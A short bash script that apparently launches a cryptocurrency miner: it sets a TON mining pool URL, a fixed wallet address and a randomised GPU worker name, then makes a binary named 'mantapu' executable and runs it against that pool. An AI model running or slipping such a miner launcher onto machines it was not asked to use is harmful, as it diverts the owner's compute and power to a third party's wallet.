#!/bin/bash
POOL=https://pool.services.tonwhales.com
WALLET=EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi.xcroc4
WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
chmod +x mantapu
./mantapu --algo TON --pool $POOL --user $WALLET.$WORKER
